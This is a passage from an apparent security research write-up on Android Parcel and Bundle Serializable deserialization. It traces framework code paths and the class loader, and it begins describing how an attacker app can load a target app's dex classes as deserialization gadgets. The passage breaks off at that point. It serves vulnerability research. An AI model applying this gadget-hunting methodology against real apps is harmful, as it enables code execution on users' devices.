+</span></span><span class=line><span class=cl>					<span class=n>Class</span><span class=o>&lt;?&gt;</span> <span class=n>c</span> <span class=o>=</span> <span class=n>Class</span><span class=o>.</span><span class=na>forName</span><span class=o>(</span><span class=n>osClass</span><span class=o>.</span><span class=na>getName</span><span class=o>(),</span> <span class=kc>false</span><span class=o>,</span> <span class=n>loader</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>					<span class=k>return</span> <span class=n>Objects</span><span class=o>.</span><span class=na>requireNonNull</span><span class=o>(</span><span class=n>c</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>				<span class=o>}</span>
+</span></span><span class=line><span class=cl>				<span class=k>return</span> <span class=kd>super</span><span class=o>.</span><span class=na>resolveClass</span><span class=o>(</span><span class=n>osClass</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>			<span class=o>}</span>
+</span></span><span class=line><span class=cl>		<span class=o>};</span>
+</span></span><span class=line><span class=cl>		<span class=n>T</span> <span class=n>object</span> <span class=o>=</span> <span class=o>(</span><span class=n>T</span><span class=o>)</span> <span class=n>ois</span><span class=o>.</span><span class=na>readObject</span><span class=o>();</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=o>(</span><span class=n>clazz</span> <span class=o>!=</span> <span class=kc>null</span> <span class=o>&amp;&amp;</span> <span class=n>loader</span> <span class=o>==</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>			<span class=c1>// If custom classloader is not provided, check the type of the serializable using
+</span></span></span><span class=line><span class=cl><span class=c1></span>			<span class=c1>// the deserialized object, as we cannot resolve the class the same way as
+</span></span></span><span class=line><span class=cl><span class=c1></span>			<span class=c1>// ObjectInputStream.
+</span></span></span><span class=line><span class=cl><span class=c1></span>			<span class=k>if</span> <span class=o>(!</span><span class=n>clazz</span><span class=o>.</span><span class=na>isAssignableFrom</span><span class=o>(</span><span class=n>object</span><span class=o>.</span><span class=na>getClass</span><span class=o>()))</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>				<span class=k>throw</span> <span class=k>new</span> <span class=n>BadTypeParcelableException</span><span class=o>(</span><span class=s>&#34;Serializable object &#34;</span>
+</span></span><span class=line><span class=cl>						<span class=o>+</span> <span class=n>object</span><span class=o>.</span><span class=na>getClass</span><span class=o>().</span><span class=na>getName</span><span class=o>()</span> <span class=o>+</span> <span class=s>&#34; is not a subclass of required class &#34;</span>
+</span></span><span class=line><span class=cl>						<span class=o>+</span> <span class=n>clazz</span><span class=o>.</span><span class=na>getName</span><span class=o>()</span> <span class=o>+</span> <span class=s>&#34; provided in the parameter&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>			<span class=o>}</span>
+</span></span><span class=line><span class=cl>		<span class=o>}</span>
+</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=n>object</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>	<span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>IOException</span> <span class=n>ioe</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>		<span class=k>throw</span> <span class=k>new</span> <span class=n>BadParcelableException</span><span class=o>(</span><span class=s>&#34;Parcelable encountered &#34;</span>
+</span></span><span class=line><span class=cl>				<span class=o>+</span> <span class=s>&#34;IOException reading a Serializable object (name = &#34;</span>
+</span></span><span class=line><span class=cl>				<span class=o>+</span> <span class=n>name</span> <span class=o>+</span> <span class=s>&#34;)&#34;</span><span class=o>,</span> <span class=n>ioe</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>	<span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>ClassNotFoundException</span> <span class=n>cnfe</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>		<span class=k>throw</span> <span class=k>new</span> <span class=n>BadParcelableException</span><span class=o>(</span><span class=s>&#34;Parcelable encountered &#34;</span>
+</span></span><span class=line><span class=cl>				<span class=o>+</span> <span class=s>&#34;ClassNotFoundException reading a Serializable object (name = &#34;</span>
+</span></span><span class=line><span class=cl>				<span class=o>+</span> <span class=n>name</span> <span class=o>+</span> <span class=s>&#34;)&#34;</span><span class=o>,</span> <span class=n>cnfe</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>	<span class=o>}</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><a href=#method-parameters-loader-and-clazz><h4 id=method-parameters-loader-and-clazz><span class=hanchor arialabel=Anchor># </span>Method parameters: <code>loader</code> and <code>clazz</code></h4></a><p>We can start to get an idea of what is going on with an high level overview of the overall method. Two parameters are accepted: <code>loader</code> and <code>clazz</code>. The <code>clazz</code> is null if <code>getSerializible</code> have not specified any class (<code>null</code> is specified in the <code>BaseBundle::getValue</code> method mentioned before). The <code>loader</code> parameter instead is passed and defined something in between the stack trace from <code>unwrapLazyValueFromMapLocked</code> and <code>android.os.Parcel.readSerializableInternal</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=cm>/* 
+</span></span></span><span class=line><span class=cl><span class=cm>runtime stack trace 
+</span></span></span><span class=line><span class=cl><span class=cm>- android.os.BaseBundle.unwrapLazyValueFromMapLocked
+</span></span></span><span class=line><span class=cl><span class=cm>- android.os.Parcel$LazyValue.apply
+</span></span></span><span class=line><span class=cl><span class=cm>- android.os.Parcel.readValue
+</span></span></span><span class=line><span class=cl><span class=cm>- android.os.Parcel.readSerializableInternal
+</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// BaseBundle::unwrapLazyValueFromMapLocked
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>private</span> <span class=n>Object</span> <span class=nf>unwrapLazyValueFromMapLocked</span><span class=o>(</span><span class=kt>int</span> <span class=n>i</span><span class=o>,</span> <span class=nd>@Nullable</span> <span class=n>Class</span><span class=o>&lt;?&gt;</span> <span class=n>clazz</span><span class=o>,</span>
+</span></span><span class=line><span class=cl>		<span class=nd>@Nullable</span> <span class=n>Class</span><span class=o>&lt;?&gt;...</span> <span class=n>itemTypes</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>	<span class=c1>// ...
+</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=n>object</span> <span class=o>=</span> <span class=o>((</span><span class=n>BiFunction</span><span class=o>&lt;</span><span class=n>Class</span><span class=o>&lt;?&gt;,</span> <span class=n>Class</span><span class=o>&lt;?&gt;[],</span> <span class=o>?&gt;)</span> <span class=n>object</span><span class=o>).</span><span class=na>apply</span><span class=o>(</span><span class=n>clazz</span><span class=o>,</span> <span class=n>itemTypes</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>	<span class=c1>// ...
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// Parcel::apply
+</span></span></span><span class=line><span class=cl><span class=c1>// https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/java/android/os/Parcel.java?q=symbol%3A%5Cbandroid.os.Parcel.LazyValue.apply%5Cb%20case%3Ayes
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>public</span> <span class=n>Object</span> <span class=nf>apply</span><span class=o>(</span><span class=nd>@Nullable</span> <span class=n>Class</span><span class=o>&lt;?&gt;</span> <span class=n>clazz</span><span class=o>,</span> <span class=nd>@Nullable</span> <span class=n>Class</span><span class=o>&lt;?&gt;[]</span> <span class=n>itemTypes</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>	<span class=cm>/* .. */</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=o>(</span><span class=n>source</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>		<span class=kd>synchronized</span> <span class=o>(</span><span class=n>source</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=o>(</span><span class=n>mSource</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>				<span class=cm>/* .. */</span>
+</span></span><span class=line><span class=cl>				<span class=n>mObject</span> <span class=o>=</span> <span class=n>source</span><span class=o>.</span><span class=na>readValue</span><span class=o>(</span><span class=n>mLoader</span><span class=o>,</span> <span class=n>clazz</span><span class=o>,</span> <span class=n>itemTypes</span><span class=o>);</span> <span class=c1>// [1]
+</span></span></span><span class=line><span class=cl><span class=c1></span>				<span class=cm>/* .. */</span>
+</span></span><span class=line><span class=cl>					<span class=n>source</span><span class=o>.</span><span class=na>setDataPosition</span><span class=o>(</span><span class=n>restore</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>				<span class=o>}</span>
+</span></span><span class=line><span class=cl>				<span class=cm>/* .. */</span>
+</span></span><span class=line><span class=cl>			<span class=o>}</span>
+</span></span><span class=line><span class=cl>		<span class=o>}</span>
+</span></span><span class=line><span class=cl>	<span class=o>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>mObject</span><span class=o>;</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// Parcel::readValue
+</span></span></span><span class=line><span class=cl><span class=c1>// https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/java/android/os/Parcel.java;drc=1cce66c0004230c737a7ef3bbc1559015d83eaa6;bpv=1;bpt=1;l=4577?gsn=readValue&amp;gs=KYTHE%3A%2F%2Fkythe%3A%2F%2Fandroid.googlesource.com%2Fplatform%2Fsuperproject%2Fmain%2F%2Fmain%3Flang%3Djava%3Fpath%3Dandroid.os.Parcel%23467d8723cbf68a577318de9ec06f6c3232392a47c55b91808cace508df664007
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>private</span> <span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span> <span class=n>T</span> <span class=nf>readValue</span><span class=o>(</span><span class=nd>@Nullable</span> <span class=n>ClassLoader</span> <span class=n>loader</span><span class=o>,</span> <span class=nd>@Nullable</span> <span class=n>Class</span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span> <span class=n>clazz</span><span class=o>,</span>
+</span></span><span class=line><span class=cl>		<span class=nd>@Nullable</span> <span class=n>Class</span><span class=o>&lt;?&gt;...</span> <span class=n>itemTypes</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>type</span> <span class=o>=</span> <span class=n>readInt</span><span class=o>();</span>
+</span></span><span class=line><span class=cl>	<span class=cm>/* .. */</span>
+</span></span><span class=line><span class=cl>	<span class=kd>final</span> <span class=n>T</span> <span class=n>object</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=o>(</span><span class=n>isLengthPrefixed</span><span class=o>(</span><span class=n>type</span><span class=o>))</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>		<span class=cm>/* .. */</span>
+</span></span><span class=line><span class=cl>		<span class=n>object</span> <span class=o>=</span> <span class=n>readValue</span><span class=o>(</span><span class=n>type</span><span class=o>,</span> <span class=n>loader</span><span class=o>,</span> <span class=n>clazz</span><span class=o>,</span> <span class=n>itemTypes</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>		<span class=cm>/* .. */</span>
+</span></span><span class=line><span class=cl>	<span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>object</span> <span class=o>=</span> <span class=n>readValue</span><span class=o>(</span><span class=n>type</span><span class=o>,</span> <span class=n>loader</span><span class=o>,</span> <span class=n>clazz</span><span class=o>,</span> <span class=n>itemTypes</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>	<span class=o>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>object</span><span class=o>;</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// Parcel::readValue
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>private</span> <span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span> <span class=n>T</span> <span class=nf>readValue</span><span class=o>(</span><span class=kt>int</span> <span class=n>type</span><span class=o>,</span> <span class=nd>@Nullable</span> <span class=n>ClassLoader</span> <span class=n>loader</span><span class=o>,</span> <span class=nd>@Nullable</span> <span class=n>Class</span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span> <span class=n>clazz</span><span class=o>,</span>
+</span></span><span class=line><span class=cl>		<span class=nd>@Nullable</span> <span class=n>Class</span><span class=o>&lt;?&gt;...</span> <span class=n>itemTypes</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>	<span class=kd>final</span> <span class=n>Object</span> <span class=n>object</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>	<span class=k>switch</span> <span class=o>(</span><span class=n>type</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>		<span class=k>case</span> <span class=n>VAL_NULL</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>			<span class=n>object</span> <span class=o>=</span> <span class=kc>null</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>			<span class=k>break</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>		<span class=cm>/* .. */</span>
+</span></span><span class=line><span class=cl>		<span class=k>case</span> <span class=n>VAL_STRING</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>			<span class=n>object</span> <span class=o>=</span> <span class=n>readString</span><span class=o>();</span>
+</span></span><span class=line><span class=cl>			<span class=k>break</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>		<span class=k>case</span> <span class=n>VAL_BYTE</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>			<span class=n>object</span> <span class=o>=</span> <span class=n>readByte</span><span class=o>();</span>
+</span></span><span class=line><span class=cl>			<span class=k>break</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>		<span class=k>case</span> <span class=n>VAL_SERIALIZABLE</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>			<span class=n>object</span> <span class=o>=</span> <span class=n>readSerializableInternal</span><span class=o>(</span><span class=n>loader</span><span class=o>,</span> <span class=n>clazz</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>			<span class=k>break</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>		<span class=cm>/* .. */</span>
+</span></span><span class=line><span class=cl>		<span class=k>default</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>			<span class=kt>int</span> <span class=n>off</span> <span class=o>=</span> <span class=n>dataPosition</span><span class=o>()</span> <span class=o>-</span> <span class=n>4</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>			<span class=k>throw</span> <span class=k>new</span> <span class=n>BadParcelableException</span><span class=o>(</span>
+</span></span><span class=line><span class=cl>				<span class=s>&#34;Parcel &#34;</span> <span class=o>+</span> <span class=k>this</span> <span class=o>+</span> <span class=s>&#34;: Unmarshalling unknown type code &#34;</span> <span class=o>+</span> <span class=n>type</span>
+</span></span><span class=line><span class=cl>						<span class=o>+</span> <span class=s>&#34; at offset &#34;</span> <span class=o>+</span> <span class=n>off</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>	<span class=o>}</span>
+</span></span><span class=line><span class=cl>	<span class=cm>/* .. */</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=o>(</span><span class=n>T</span><span class=o>)</span> <span class=n>object</span><span class=o>;</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Most of the code is related to the unmarshalling process of Parcel objects and has been intentionally removed to focus on our main scope. The <code>loader</code> parameter that we were searching for seems to originate in the <code>Parcel::apply</code> [1] method. <code>mLoader</code>, in the <code>Parcel</code> context, is a class member of type <code>ClassLoader</code> and is defined in the <code>Parcel::LazyValue</code> constructor as the last parameter. The Lazy bundle mechanism is a &ldquo;newly&rdquo; (some years ago) introduced way to lazily deserialize parcels upon a prefixed length that has been well explained in the talk &ldquo;
+<a href="https://www.youtube.com/watch?v=qIzMKfOmIAA" rel=noopener>Android Parcels: The Bad, the Good and the Better - Introducing Android&rsquo;s Safer Parcel</a>&rdquo;.</p><p>By dynamically hooking the <code>readSerializableInternal</code> using frida, the loader (of type <code>dalvik.system.PathClassLoader</code>) has the following value:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>dalvik.system.PathClassLoader[DexPathList[[zip file &#34;/data/app/~~pSOjjaFofZg9BArMhAPO3w==/com.example.serialized.receiver-xCRsymIZLPj1E9xRk7LQpw==/base.apk&#34;],nativeLibraryDirectories=[/data/app/~~pSOjjaFofZg9BArMhAPO3w==/com.example.serialized.receiver-xCRsymIZLPj1E9xRk7LQpw==/lib/arm64, /system/lib64, /system_ext/lib64]]]
+</span></span></code></pre></td></tr></table></div></div><p>The loader, of type <code>dalvik.system.PathClassLoader</code>, is used to resolve passed objects and contains the following paths (<code>DexPathList</code>):</p><ul><li><code>/data/app/~~pSOjjaFofZg9BArMhAPO3w==/com.example.serialized.receiver-xCRsymIZLPj1E9xRk7LQpw==/base.apk</code></li><li><code>/data/app/~~pSOjjaFofZg9BArMhAPO3w==/com.example.serialized.receiver-xCRsymIZLPj1E9xRk7LQpw==/lib/arm64</code></li><li><code>/system/lib64</code></li><li><code>/system_ext/lib64</code></li></ul><p>The first two paths are application specific while the last two are system specific. First, pretty obvious, statement: input objects must be defined in the application or system context.</p><a href=#class-resolution><h4 id=class-resolution><span class=hanchor arialabel=Anchor># </span>Class resolution</h4></a><p>Now that we have a more understanding of both <code>loader</code> and <code>clazz</code> parameters, we can come back to the <code>readSerializableInternal</code> source code shown above. If <code>clazz</code> is defined, <code>Class.forName</code> is used against the input class name from the parcel to return the <code>Class</code> object and verified with <code>isAssignableFrom</code> (and <code>BadTypeParcelableException</code> is thrown if it doesn&rsquo;t &ldquo;match&rdquo;). Since we are interested in the <code>getSerializable</code> surface without the explicit type casting, the <code>clazz</code> is null in these cases and the following code is executed:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kt>byte</span><span class=o>[]</span> <span class=n>serializedData</span> <span class=o>=</span> <span class=n>createByteArray</span><span class=o>();</span>
+</span></span><span class=line><span class=cl><span class=n>ByteArrayInputStream</span> <span class=n>bais</span> <span class=o>=</span> <span class=k>new</span> <span class=n>ByteArrayInputStream</span><span class=o>(</span><span class=n>serializedData</span><span class=o>);</span>
+</span></span><span class=line><span class=cl><span class=n>ObjectInputStream</span> <span class=n>ois</span> <span class=o>=</span> <span class=k>new</span> <span class=n>ObjectInputStream</span><span class=o>(</span><span class=n>bais</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>	<span class=nd>@Override</span>
+</span></span><span class=line><span class=cl>	<span class=kd>protected</span> <span class=n>Class</span><span class=o>&lt;?&gt;</span> <span class=n>resolveClass</span><span class=o>(</span><span class=n>ObjectStreamClass</span> <span class=n>osClass</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>			<span class=kd>throws</span> <span class=n>IOException</span><span class=o>,</span> <span class=n>ClassNotFoundException</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>		<span class=c1>// try the custom classloader if provided
+</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=k>if</span> <span class=o>(</span><span class=n>loader</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>			<span class=n>Class</span><span class=o>&lt;?&gt;</span> <span class=n>c</span> <span class=o>=</span> <span class=n>Class</span><span class=o>.</span><span class=na>forName</span><span class=o>(</span><span class=n>osClass</span><span class=o>.</span><span class=na>getName</span><span class=o>(),</span> <span class=kc>false</span><span class=o>,</span> <span class=n>loader</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>			<span class=k>return</span> <span class=n>Objects</span><span class=o>.</span><span class=na>requireNonNull</span><span class=o>(</span><span class=n>c</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>		<span class=o>}</span>
+</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=kd>super</span><span class=o>.</span><span class=na>resolveClass</span><span class=o>(</span><span class=n>osClass</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>	<span class=o>}</span>
+</span></span><span class=line><span class=cl><span class=o>};</span>
+</span></span><span class=line><span class=cl><span class=n>T</span> <span class=n>object</span> <span class=o>=</span> <span class=o>(</span><span class=n>T</span><span class=o>)</span> <span class=n>ois</span><span class=o>.</span><span class=na>readObject</span><span class=o>();</span>
+</span></span></code></pre></td></tr></table></div></div><p>A byte array is read from the parcel using <code>createByteArray</code> (<code>serializedData</code>) and used to initialize a
+<a href=https://developer.android.com/reference/java/io/ByteArrayInputStream rel=noopener><code>ByteArrayInputStream</code></a> (<code>bais</code>) that is used to init
+<a href=https://developer.android.com/reference/java/io/ObjectInputStream rel=noopener><code>ObjectInputStream</code></a> (<code>ois</code>) overriding the <code>resolveClass</code> method with a different logic if the <code>loader</code> is defined (our case). The logic is however similar to the &ldquo;original&rdquo;
+<a href=https://developer.android.com/reference/java/io/ObjectInputStream#resolveClass%28java.io.ObjectStreamClass%29 rel=noopener><code>resolveClass</code></a> behavior, as mentioned in the
+<a href=https://developer.android.com/reference/java/io/ObjectInputStream#resolveClass%28java.io.ObjectStreamClass%29 rel=noopener>documentation</a>:</p><blockquote><p>The default implementation of this method in <code>ObjectInputStream</code> returns the result of calling <code>Class.forName(desc.getName(), false, loader)</code></p></blockquote><a href=#objectinputstream><h3 id=objectinputstream><span class=hanchor arialabel=Anchor># </span><code>ObjectInputStream</code></h3></a><p>The
+<a href=https://developer.android.com/reference/java/io/ObjectInputStream#resolveClass%28java.io.ObjectStreamClass%29 rel=noopener><code>ObjectInputStream</code></a> seems our next desired target to deep in. It is a
+<a href=https://docs.oracle.com/javase/8/docs/api/?java/io/ObjectInputStream.html rel=noopener>Java class object</a> and we can extract few interesting statements from its official documentation:</p><blockquote><p>An ObjectInputStream ==deserializes primitive data and objects== previously written using an ObjectOutputStream.</p></blockquote><blockquote><p>The method ==<code>readObject</code> is used to read an object from the stream==. Java&rsquo;s safe casting should be used to get the desired type.</p></blockquote><blockquote><p>==Reading an object is analogous to running the constructors== of a new object.</p></blockquote><blockquote><p>The default deserialization mechanism for objects ==restores the contents of each field== to the value and type it had when it was written.</p></blockquote><blockquote><p>Classes control how they are serialized by ==implementing== either the ==java.io.Serializable== or ==java.io.Externalizable== interfaces. ==Only objects== that support the java.io.Serializable or java.io.Externalizable interface can be read from streams.</p></blockquote><p>Since it&rsquo;s not an Android specific class, there are different online resources that have already covered the most out of it, especially this interesting talk back in 2016:
+<a href="https://www.youtube.com/watch?v=9Bw1urhk8zw" rel=noopener>&ldquo;Java deserialization vulnerabilities - The forgotten bug class&rdquo; by Matthias Kaiser</a>. The key concept that we can summarize is that, in our case, the <code>resolveClass</code> method in <code>ObjectInputStream</code> is overriden in order to use the &ldquo;custom&rdquo; class loader provided from the method parameter and that the deserialization process actually starts at
+<a href="https://cs.android.com/android/platform/superproject/main/+/main:libcore/ojluni/src/main/java/java/io/ObjectInputStream.java;l=420;drc=7f1a1070dbdd1bda00223be2f21936f63a8f3850" rel=noopener><code>ois.readObject</code></a>.</p><a href=#objectinputstreamreadobject><h4 id=objectinputstreamreadobject><span class=hanchor arialabel=Anchor># </span><code>ObjectInputStream::readObject</code></h4></a><p>Finally we are at the core of the deserialization process and we can state that we are in a generic Java deserialization mechanism using the <code>ObjectInputStream::readObject</code> method. <del>My curiosity instinct tells me to go deeper far into the Java
+<a href=https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html rel=noopener>Object Serialization Stream Protocol</a> parsing process but the rational part reminds me to stay on the objective</del> (spoiler: I did it, partially). However, if you desire, you can go far deeper starting from
+<a href="https://cs.android.com/android/platform/superproject/main/+/main:libcore/ojluni/src/main/java/java/io/ObjectInputStream.java;l=420;drc=7f1a1070dbdd1bda00223be2f21936f63a8f3850" rel=noopener><code>ObjectInputStream::readObject</code></a> and
+<a href="https://cs.android.com/android/platform/superproject/main/+/main:libcore/ojluni/src/main/java/java/io/ObjectInputStream.java;l=1389;drc=7f1a1070dbdd1bda00223be2f21936f63a8f3850" rel=noopener><code>ObjectInputStream::readObject0</code></a>.</p><a href=#deserialization-summary><h2 id=deserialization-summary><span class=hanchor arialabel=Anchor># </span>Deserialization Summary</h2></a><p>The code overview lead us to a pretty trivial conclusion: input objects are deserialized using the common Java <code>ObjectInputStream::readObject</code> mechanism and the class loader includes <strong>application</strong> and <strong>system</strong> specific paths. With that in mind, we are now aware that we are in a common Java deserialization scenario where we can instantiate system or application classes that implements the <code>java.io.Serialiazible</code> or <code>java.io.Externalizable</code> interfaces. In order to create an impactful scenario, do we <del><strong>only</strong></del> need to find an useful gadget?</p><a href=#all-you-need-is-a-good-gadget-right><h2 id=all-you-need-is-a-good-gadget-right><span class=hanchor arialabel=Anchor># </span>All you need is a good gadget, right?</h2></a><p>Instantiate a system object is pretty straightforward: you import the appropriate module and create the object from there. The same apply for third-party library objects, you regularly import them and you can use the exported classes. However, what if we want to target a specific class from a specific application? In this specific case, things are a little bit different.</p><a href=#application-specific-gadgets><h3 id=application-specific-gadgets><span class=hanchor arialabel=Anchor># </span>Application specific gadgets</h3></a><p>In order to properly instantiate a target application object into another application it is possible to use dynamic code loading and reflection. First, after having identified the target object, it is necessary to extract the respective <code>classesN.dex</code> file and store it in the application resources of the attacker application (or in any other desired way). It is possible to identify the appropriate dex file by reverse engineering the target application with <code>jadx-gui</code> , where the filename is displayed in the reversed Java code. Then, with <code>apktool</code> it is possible to directly extract it (<code>apktool --no-src d app.apk</code>).</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
